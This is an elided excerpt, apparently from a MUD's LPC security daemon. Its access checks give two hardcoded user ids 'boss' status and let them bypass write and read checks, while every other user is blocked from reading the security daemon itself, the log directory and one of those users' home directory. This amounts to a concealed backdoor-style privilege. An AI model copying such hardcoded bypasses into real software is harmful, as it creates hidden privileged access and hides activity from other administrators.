...
string get_status(mixed ob)
{
    ...
    if ( euid=="daniel" ) return "(boss)";
    if ( euid=="zjb" ) return "(boss)";
...
int set_status(mixed ob, string status)
{
    ...
    if( geteuid(this_player(1)) != "zjb"&& geteuid(this_player(1)) != "daniel"|| 
...
//     if ( file=="/adm/daemons/securityd.c" ) return 0;
     if ( geteuid(me)!="zjb" && geteuid(me)!="daniel" ) {
             switch(file)
             {
...
int valid_read(string file, mixed user, string func)
{
    ...
    object ob = this_player();
     ...
     if ( !ob ) return 0;
     if ( geteuid(ob)!="zjb" && geteuid(ob)!="daniel" ) {
             switch(file)
             {
             case "/adm/daemons/securityd.c":
                     return 0;
    ...
    if ( geteuid(ob)!="zjb"&&geteuid(ob)!="daniel" ) 
    {
      if( sscanf(file,"/log/%*s") || sscanf(file,"/u/zjb/%*s") )
      {
